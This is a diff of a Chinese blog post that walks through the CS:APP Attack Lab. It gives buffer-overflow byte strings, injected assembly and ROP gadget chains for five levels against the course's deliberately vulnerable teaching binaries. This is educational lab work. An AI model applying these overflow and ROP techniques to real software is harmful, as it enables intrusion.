@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="index, follow">
 <title>[CSAPPLAB]Attack Lab | intenのblog🍦</title>
-<meta name="keywords" content="" />
+<meta name="keywords" content="CSAPPLAB" />
 <meta name="description" content="ctarget 首先执行getbuf函数，读取标准输入。
 unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
 FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
@@ -19,7 +19,7 @@ FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.">
 <meta name="author" content="">
 <link rel="canonical" href="https://inten.kro1lsec.com/post/csapplabattack-lab/" />
-<link crossorigin="anonymous" href="/assets/css/stylesheet.min.84cc6e7cd97516a4d4e877c6bebe5a4529afdf61f4d009e2c8bbec3a876fff4e.css" integrity="sha256-hMxufNl1FqTU6HfGvr5aRSmv32H00AniyLvsOodv/04=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.fe63ae84f306727c713665eb03a6c71ec6c611434c8182ba17ba7e7d26a979e9.css" integrity="sha256-/mOuhPMGcnxxNmXrA6bHHsbGEUNMgYK6F7p&#43;fSapeek=" rel="preload stylesheet" as="style">
 <script defer crossorigin="anonymous" src="/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js" integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5&#43;kdJvBz5iKbt6B5PJI="
     onload="hljs.initHighlightingOnLoad();"></script>
 <link rel="icon" href="https://inten.kro1lsec.com/favicon.ico">
@@ -88,7 +88,7 @@ FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
   "name": "[CSAPPLAB]Attack Lab",
   "description": "ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.",
   "keywords": [
-    
+    "CSAPPLAB"
   ],
   "articleBody": "ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctargetctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \"No exploit. Getbuf returned 0x%x\\n\" stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。\n./hex2raw 2.txt ./ctarget -qi 2.txt 1.2level 2 要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie\n小建议\n touch2的参数val是利用rdi寄存器进行传递的 你要利用某种方式让getbuf的返回地址为touch2的地址 你的注入代码的传入参数应该等于cookie的值。 不要在注入代码内调用ret或者call 请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。  touch2的代码如下\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); } else { printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); } exit(0); } 逻辑：比较我们传入的参数val是否等于cookie的值，如果等于就可以通过。\n本题的关键就是在改变返回地址前也设置rdi寄存器的值。\n插入的汇编代码\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret 查看他的字节序表示\nAttack Lab$ vim l2.s Attack Lab$ gcc -c l2.s Attack Lab$ objdump -d l2.o l2.o： 文件格式 elf64-x86-64 Disassembly of section .text: 0000000000000000 : 0:\t48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7:\t68 ec 17 40 00 pushq $0x4017ec c:\tc3 retq stack : padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Attack Lab$ ./hex2raw 2.txt Attack Lab$ ./ctarget -qi 2.txt 1.3level 3 hexmatch和touch3的代码如下。\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); //s=val=cookie  return strncmp(sval, s, 9) == 0; //比较cookie和第二个参数的前9位是否相同  // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为'\\0'  } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { //相同则成功  printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } 任务: 你的任务getbuf之后执行touch3而不是继续执行test。你必须要传递cookie字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。\n小建议\n 你需要在利用缓冲区溢出的字符串中包含cookie的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x 注意在c语言中的字符串表示会在末尾处加一个\\0 您注入的代码应将寄存器％rdi设置为此字符串的地址 调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放getbuf使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的Cookie字符串  字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。 而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)\n简单分析touch3\n00000000004018fa touch3: 4018fa: 53 push %rbx 4018fb: 48 89 fb mov %rdi,%rbx 4018fe: c7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc vlevel 401905: 00 00 00 401908: 48 89 fe mov %rdi,%rsi 40190b: 8b 3d d3 2b 20 00 mov 0x202bd3(%rip),%edi # 6044e4 cookie 401911: e8 36 ff ff ff callq 40184c hexmatch 401916: 85 c0 test %eax,%eax 逻辑非常简单首先把rdi的值传递给rsi然后把cookie的值传递给rdi调用hexmatch函数。这里rsi的值应该就是我们的字符串数组的起始地址。\n这里我们注意hexmatch函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串s的地址我们是没法估计 的。并且提示中告诉了我们hexmatch和strncmp函数可能会覆盖我们getbuf的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到text的栈帧中。我们在getbuf分配栈帧之前打一个断点。\nb *0x4017a8 (gdb) b *0x4017a8 Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) r -q #gdb调试时传参数放在里面 Starting program: /csapp/attack/ctarget -q warning: Error disabling address space randomization: Operation not permitted Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64 Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) info r rsp rsp 0x5561dca0 0x5561dca0 stack : padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))\n48 c7 c7 a8 dc 61 55 68 Attack Lab$ ./hex2raw 3.txt Attack Lab$ ./ctarget -qi 3.txt 2.1level 4 思考： 首先要把cookie传入%rdi，然后再转入到touch2函数。\n根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi\n这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。\n方法一\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rcc 19 40 00 00 00 00 00 /* jump 0x4019cc; popq %rax */\rfa 97 b9 59 00 00 00 00 /* cookie */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5; movq %rax, %rdi */\rec 17 40 00 00 00 00 00 /* touch2 */\r方法二\n@le2.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 2b 40 00 00 00 00 00 #pop %rdi fa 97 b9 59 00 00 00 00 #cookie ec 17 40 00 00 00 00 00 #touch2 ./hex2raw 2.2level 5 肝不动了，参考别人的。\n思考：\n同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。\n首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。\n第二个问题，一开始在gadgets farm找到许多如下的操作：\nmov $0x909078fb,%eax lea -0x3c3876b8(%rdi),%eax movl $0xc7c78948,(%rdi) …… 所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。\n后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。\nexploit-5 关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\r06 1a 40 00 00 00 00 00 /* jump 0x401a06 ;movq %rsp, %rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rab 19 40 00 00 00 00 00 /* jump 0x4019ab ;popq %rax */\r48 00 00 00 00 00 00 00 /* distance from here to cookie string */\rdd 19 40 00 00 00 00 00 /* jump 0x4019dd ;movl %eax, %edx */\r34 1a 40 00 00 00 00 00 /* jump 0x401a34 ;movl %edx, %ecx */\r13 1a 40 00 00 00 00 00 /* jump 0x401a13 ;movl %ecx, %esi */\rd6 19 40 00 00 00 00 00 /* jump 0x4019d6 ;lea (%rdi,%rsi,1),%rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rfa 18 40 00 00 00 00 00 /* touch3 */\r35 39 62 39 39 37 66 61 /* cookie string */\r00 00 00 00 00 00 00 00 /* string ends with 00 */\r",
   "wordCount" : "988",
@@ -187,7 +187,7 @@ FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
                 </button>
             </span>
         </div>
-        <ul id="menu" onscroll="menu_on_scroll()">
+        <ul id="menu">
             <li>
                 <a href="https://inten.kro1lsec.com/archives" title="Archive">
                     <span>Archive</span>
@@ -216,7 +216,28 @@ FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
     </h1>
     <div class="post-meta">April 20, 2021&nbsp;·&nbsp;5 min
 </div>
-  </header> 
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <div class="details">Table of Contents</div>
+        </summary>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#11level-1" aria-label="1.1level 1"><strong>1.1level 1</strong></a></li>
+                <li>
+                    <a href="#12level-2" aria-label="1.2level 2"><strong>1.2level 2</strong></a></li>
+                <li>
+                    <a href="#13level-3" aria-label="1.3level 3"><strong>1.3level 3</strong></a></li>
+                <li>
+                    <a href="#21level-4" aria-label="2.1level 4"><strong>2.1level 4</strong></a></li>
+                <li>
+                    <a href="#22level-5" aria-label="2.2level 5"><strong>2.2level 5</strong></a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
   <div class="post-content"><p><strong>ctarget</strong>
 首先执行getbuf函数，读取标准输入。</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">unsigned</span> <span style="color:#a6e22e">getbuf</span>()
@@ -445,10 +466,15 @@ fa 18 40 00 00 00 00 00     /* touch3                                       */
 35 39 62 39 39 37 66 61     /* cookie string                                */
 00 00 00 00 00 00 00 00     /* string ends with 00                          */
 </code></pre>
-</div>
-  <footer class="post-footer"><div class="share-buttons">
+
+  </div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://inten.kro1lsec.com/tags/csapplab/">CSAPPLAB</a></li>
+    </ul>
+<div class="share-buttons">
     <a target="_blank" rel="noopener noreferrer" aria-label="share [CSAPPLAB]Attack Lab on twitter"
-        href="https://twitter.com/intent/tweet/?text=%5bCSAPPLAB%5dAttack%20Lab&amp;url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f&amp;hashtags=">
+        href="https://twitter.com/intent/tweet/?text=%5bCSAPPLAB%5dAttack%20Lab&amp;url=https%3a%2f%2finten.kro1lsec.com%2fpost%2fcsapplabattack-lab%2f&amp;hashtags=CSAPPLAB">
         <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
             <path
                 d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
@@ -496,7 +522,6 @@ fa 18 40 00 00 00 00 00     /* touch3                                       */
     </main>
     <footer class="footer">
     <span>&copy; 2021 <a href="https://inten.kro1lsec.com/">intenのblog🍦</a></span>
-    <span>&middot;</span>
     
 </footer>
 <a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
@@ -508,14 +533,10 @@ fa 18 40 00 00 00 00 00     /* touch3                                       */
 </a>
 
 <script>
-    window.onload = function () {
-        if (localStorage.getItem("menu-scroll-position")) {
-            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
-        }
-    }
-
-    function menu_on_scroll() {
-        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    let menu = document.getElementById('menu')
+    menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+    menu.onscroll = function () {
+        localStorage.setItem("menu-scroll-position", menu.scrollLeft);
     }
 
     document.querySelectorAll('a[href^="#"]').forEach(anchor => {
@@ -562,43 +583,6 @@ fa 18 40 00 00 00 00 00     /* touch3                                       */
         }
     })
 
-</script>
-<script>
-    document.querySelectorAll('pre > code').forEach((codeblock) => {
-        const container = codeblock.parentNode.parentNode;
-
-        const copybutton = document.createElement('button');
-        copybutton.classList.add('copy-code');
-        copybutton.innerText = 'copy';
-
-        function copyingDone() {
-            copybutton.innerText = 'copied!';
-            setTimeout(() => {
-                copybutton.innerText = 'copy';
-            }, 2000);
-        }
-
-        copybutton.addEventListener('click', (cb) => {
-            if ('clipboard' in navigator) {
-                navigator.clipboard.writeText(codeblock.textContent);
-                copyingDone();
-                return;
-            }
-
-            const range = document.createRange();
-            range.selectNodeContents(codeblock);
-            const selection = window.getSelection();
-            selection.removeAllRanges();
-            selection.addRange(range);
-            try {
-                document.execCommand('copy');
-                copyingDone();
-            } catch (e) { };
-            selection.removeRange(range);
-        });
-
-        container.appendChild(copybutton);
-    });
 </script>
 </body>
 
